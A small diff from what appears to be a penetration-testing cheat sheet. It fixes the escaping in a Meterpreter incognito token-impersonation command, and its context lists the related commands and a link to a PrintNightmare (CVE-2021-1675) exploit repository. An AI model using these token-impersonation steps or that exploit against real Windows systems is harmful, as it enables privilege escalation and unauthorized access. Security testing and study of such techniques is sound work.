@@ -83,7 +83,7 @@ EXPLOITATION: https://www.offensive-security.com/metasploit-unleashed/fun-incogn
 
 load_incognito //load module.
 list_tokens -u //list tokens for users.
-impersonate_token domain\username //exploit.
+impersonate_token domain\\username //exploit.
 
 ## PrintNightmare CVE-2021-1675
 Linux: https://github.com/cube0x0/CVE-2021-1675.git
